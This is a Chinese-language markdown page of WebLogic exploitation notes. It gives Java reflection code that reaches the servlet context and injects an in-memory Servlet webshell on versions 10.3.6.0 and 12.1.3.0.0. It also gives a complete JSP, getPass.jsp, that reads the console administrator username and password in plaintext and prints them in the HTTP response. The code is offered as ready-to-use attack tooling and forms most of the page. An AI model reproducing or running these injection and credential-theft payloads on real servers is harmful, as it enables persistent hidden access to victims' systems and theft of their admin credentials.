
## 漏洞利用

### 内存马

#### 获取上下文 WebAppServletContext

- WebAppServletContext

```java
Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
Method getCurrentWork = executeThread.getDeclaredMethod("getCurrentWork");
Object currentWork = getCurrentWork.invoke(Thread.currentThread());
WebAppServletContext webAppServletContext;
try { 
	// weblogic 12.1.3
	Field connectionHandler = currentWork.getClass().getDeclaredField("connectionHandler");
	connectionHandler.setAccessible(true);
	Object httpConnectionHandler = connectionHandler.get(currentWork);
	Field requestF = httpConnectionHandler.getClass().getDeclaredField("request");
	requestF.setAccessible(true);
	httpConnectionHandler = requestF.get(httpConnectionHandler);
	java.lang.reflect.Field contextF = httpConnectionHandler.getClass().getDeclaredField("context");
	contextF.setAccessible(true);
	webAppServletContext = (WebAppServletContext) contextF.get(httpConnectionHandler);
} catch (Exception e) {
	// weblogic 1036
	Field contextF = currentWork.getClass().getDeclaredField("context");
	contextF.setAccessible(true);
	webAppServletContext = (WebAppServletContext) contextF.get(currentWork);
}
```

#### 动态注册Servlet内存马  

跟了一下从web.xml添加servet的流程，可以使用registerServlet方法注册Servlet，不过不同版本的weblogic对该方法有不同实现:

##### 10.3.6.0
![image](https://user-images.githubusercontent.com/55024146/143993515-f149070e-9ea0-487b-8dbf-fcb8f1682fcd.png)


成员方法
- weblogic.servlet.internal.WebAppServletContext#registerServlet()

![image](https://user-images.githubusercontent.com/55024146/143996030-4614d0d7-e77f-47e6-8540-ec40f41dc296.png)



反射调用
```java
Method registerServlet = webAppServletContext.getClass().getDeclaredMethod("registerServlet", String.class, String.class, String.class, Map.class);
registerServlet.setAccessible(true);
HashMap hashMap = new HashMap();
registerServlet.invoke(webAppServletContext, "TestServlet", "/abcd", servletClass.getName(), hashMap);
```
测试效果

![image](https://user-images.githubusercontent.com/55024146/143996228-773c6cf8-c801-4068-bcd9-8ce03e016de2.png)


##### 12.1.3.0.0

成员方法
- weblogic.servlet.internal.WebAppServletContext#registerServlet()
![image](https://user-images.githubusercontent.com/55024146/143996176-db4ea7f0-568b-492e-b20a-07ef8727f29c.png)


同样的，反射调用

```java
Method registerServlet = webAppServletContext.getClass().getDeclaredMethod("registerServlet", String.class, String.class, String.class);
registerServlet.setAccessible(true);
registerServlet.invoke(webAppServletContext, "TestServlet", "/121300", servletClass.getName());
response.getWriter().write("Servlet Injected Successfully!!!");
```

测试效果

![image](https://user-images.githubusercontent.com/55024146/143996258-5aef7689-b745-4273-95b8-e2f74776bb01.png)



#### 动态注册Listener内存马  


#### 动态注册Filter内存马  

##### 10.3.6.0

测试效果

![image](https://user-images.githubusercontent.com/55024146/144036760-4c29b12c-2b28-4270-a82b-7c812e2f7922.png)



##### 12.1.3.0.0

测试效果

![image](https://user-images.githubusercontent.com/55024146/144036974-997a4c40-c302-4c21-8770-e8581b6a9104.png)





### 获取Weblogic console用户名&密码(免解密)-getPass.jsp

以往遇上weblogic的站点时都是通过密钥进行解密获取console的密码，甚至但是解密方法就出现好几种，

![image](vulnerability-research.assets/144720808-7e3efafd-8126-4994-bd78-945e314ff3ac.png)

但是前几个小时在twitter @jas502n师傅公开了[Use T3 protocol Get weblogic console username, password](https://twitter.com/jas502n/status/1467122190760177664)这个姿势，于是赶紧学习学习！！！


断点看看代码细节：

![image](vulnerability-research.assets/144720899-5b80c842-e6dd-47c2-b2fc-e3c60ba2a8f5.png)

代码实现

> ```jsp
> <%@page import="java.lang.reflect.Field" %>
> <%@page import="java.lang.reflect.Method" %>
> 
> <%
>   /**
>    * 已测试：
>    *  10.3.6.0
>    */
>   try{
>     ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
>     Class httpDataTransferHandler = classLoader.loadClass("weblogic.deploy.service.datatransferhandlers.HttpDataTransferHandler");
>     Class managementService = classLoader.loadClass("weblogic.management.provider.ManagementService");
>     Class authenticatedSubject = classLoader.loadClass("weblogic.security.acl.internal.AuthenticatedSubject");
>     Class propertyService = classLoader.loadClass("weblogic.management.provider.PropertyService");
>     Field KERNE_ID = httpDataTransferHandler.getDeclaredField("KERNE_ID");
>     KERNE_ID.setAccessible(true);
>     Method getPropertyService = managementService.getMethod("getPropertyService",authenticatedSubject);
>     getPropertyService.setAccessible(true);
>     Object prop = getPropertyService.invoke((Object) null,KERNE_ID.get((Object) null));
>     Method getTimestamp1 = propertyService.getMethod("getTimestamp1");
>     getTimestamp1.setAccessible(true);
>     Method getTimestamp2 = propertyService.getMethod("getTimestamp2");
>     getTimestamp2.setAccessible(true);
>     String username = (String) getTimestamp1.invoke(prop);
>     String password = (String) getTimestamp2.invoke(prop);
>     response.getWriter().write( username + "/" + password);
>   }catch (Exception e) {
>     e.printStackTrace();
>   }
> %>
> ```

测试效果

![image](vulnerability-research.assets/144720974-59cb9fd5-65df-4dae-a9f8-fd103719f499.png)

